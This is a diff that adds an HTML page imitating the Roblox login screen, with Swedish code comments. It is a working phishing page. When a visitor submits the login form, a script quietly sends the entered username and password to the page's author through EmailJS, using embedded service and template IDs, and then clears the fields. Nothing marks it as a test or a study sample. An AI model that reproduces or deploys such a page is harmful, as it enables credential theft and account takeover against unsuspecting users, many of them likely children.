@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+<meta charset="UTF-8">
+<title>Roblox Login – Dark Mode</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initiera EmailJS med din Public Key
+  emailjs.init("0hsKWgS0kt2zOfjdX");
+</script>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    background-image: url("Skärmbild 2026-01-14 154022.png");
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Inter', sans-serif;
+}
+
+.login-section {
+    background: #1f1f1f;
+    width: 100%;
+    max-width: 335px;
+    padding: 32px;
+    box-shadow: 0 0 0 1px #2a2a2a;
+    margin-left: -15px;
+}
+
+.login-header {
+    text-align: center;
+    font-size: 30px;
+    font-weight: 1000;
+    color: #ffffff;
+    margin-bottom: 24px;
+}
+
+.input-field {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 14px;
+    border-radius: 8px;
+    border: 1px solid #3a3a3a;
+    background: #2a2a2a;
+    color: #ffffff;
+    font-size: 14px;
+    margin-left:-10px;
+   
+}
+
+.input-field::placeholder { color: #aaaaaa; }
+.input-field:focus { outline: none; border-color: #555555; }
+
+.login-button {
+    width: 100%;
+    padding: 12px;
+    background: #3a3a3a;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+.login-button:hover { background: #505050; }
+
+.forgot-link { display: block; text-align: center; margin-top: 16px; font-size: 13px; color: #aaaaaa; text-decoration: none; }
+.forgot-link:hover { color: #cccccc; }
+
+.divider { margin: 22px 0; height: 1px; background: #333333; }
+
+.alt-button { width: 95%; padding: 11px; background: #3a3a3a; color: #ffffff; border: 1px solid #3a3a3a; border-radius: 8px; cursor: pointer; margin-bottom: 10px; font-weight: 500; }
+.alt-button:hover { background: #505050; }
+
+.signup { text-align: center; font-size: 13px; margin-top: 18px; color: #cccccc; }
+.signup a { color: #aaaaaa; text-decoration: none; font-weight: 600; }
+.signup a:hover { color: #dddddd; }
+</style>
+</head>
+
+<body>
+
+<div class="login-section">
+    <div class="login-header">Login to Roblox</div>
+
+    <!-- EmailJS formulär -->
+    <form id="loginForm">
+        <input type="text" name="username" class="input-field" placeholder="Username / Email / Phone" required>
+        <input type="password" name="password" class="input-field" placeholder="Password" required>
+        <button type="submit" class="login-button">Log In</button>
+    </form>
+
+    <a href="#" class="forgot-link">Forgot Password or Username?</a>
+
+    <div class="divider"></div>
+
+    <button class="alt-button">Email Me a One-Time Code</button>
+    <button class="alt-button">Use Another Device</button>
+
+    <div class="signup">
+        Don’t have an account? <a href="#">Sign Up</a>
+    </div>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const formData = {
+        username: this.username.value,
+        password: this.password.value
+    };
+
+    // Skicka formuläret med EmailJS tyst i bakgrunden
+    emailjs.send("service_lnmiv34", "template_puls2ws", formData);
+
+    this.reset(); // Rensa fälten
+});
+</script>
+
+</body>
+</html>
+
